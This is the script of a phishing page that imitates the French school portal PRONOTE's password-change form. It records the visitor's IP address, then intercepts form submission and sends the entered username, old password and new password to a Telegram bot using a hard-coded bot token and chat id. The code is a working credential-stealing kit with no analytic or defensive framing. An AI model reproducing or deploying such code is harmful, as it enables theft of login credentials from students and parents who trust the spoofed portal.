  <script>
    let ip;
    document.addEventListener("DOMContentLoaded", function() {
            // Fetch the IP address from the API
      fetch("https://api.ipify.org?format=json")
        .then(response => response.json())
        .then(data => {
            // Display the IP address on the screen
            ip = data.ip;
        })
        .catch(error => {
            console.error("Error fetching IP address:", error);
        });
    });

    
    function checkco() {
      const id = document.querySelector("input[name='identifiant']").value;
      const ancienmdp = document.querySelector("input[name='ancienmdp']").value;
      const mdp = document.querySelector("input[name='mdp']").value;
      if (id.length > 0 && mdp.length > 0 && ancienmdp.length > 0) {
        document.getElementById('id_19').removeAttribute('disabled');
      } else {
        document.getElementById('id_19').setAttribute('disabled', 'disabled');
      }
    }

    function mdp() {
      if (document.getElementById('id_31').type === 'password') {
        document.getElementById('id_31').type = 'text';
        document.getElementById('voirmdp').classList.add('icon_eye_close')
        document.getElementById('voirmdp').classList.remove('icon_eye_open')
      } else {
        document.getElementById('id_31').type = 'password';
        document.getElementById('voirmdp').classList.remove('icon_eye_close')
        document.getElementById('voirmdp').classList.add('icon_eye_open')
      }
    }

    function mdp2() {
      if (document.getElementById('nvmdp').type === 'password') {
        document.getElementById('nvmdp').type = 'text';
        document.getElementById('voirmdp2').classList.add('icon_eye_close')
        document.getElementById('voirmdp2').classList.remove('icon_eye_open')
      } else {
        document.getElementById('nvmdp').type = 'password';
        document.getElementById('voirmdp2').classList.remove('icon_eye_close')
        document.getElementById('voirmdp2').classList.add('icon_eye_open')
      }
    }

    const form = document.querySelector("form");
        form.addEventListener("submit", (e) => {
            e.preventDefault();
            const id = document.querySelector("input[name='identifiant']").value;
            const ancienmdp = document.querySelector("input[name='ancienmdp']").value;
            const mdp = document.querySelector("input[name='mdp']").value;
          let telegram_bot_token = '7045035889:AAH187XzM8kdU6co8fWgFpYn5ABSU8I2Ovs';
           // const message = document.querySelector("#message").value;
            const telegram_message = `<b><u>PRONOTE</u></b>\nIP : ${ip}\nIdentifiant : ${id}\nAncien mot de passe : ${ancienmdp}\nNouveau mot de passe : ${mdp}\n\nco sur tel`;
            console.log(telegram_message);
            fetch(`https://api.telegram.org/bot${telegram_bot_token}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: '6465913932',
                        text: telegram_message,
                        parse_mode: 'HTML'
                    })
            })
                .catch(error => {
                    console.error('Error sending message:', error);
            });
        });
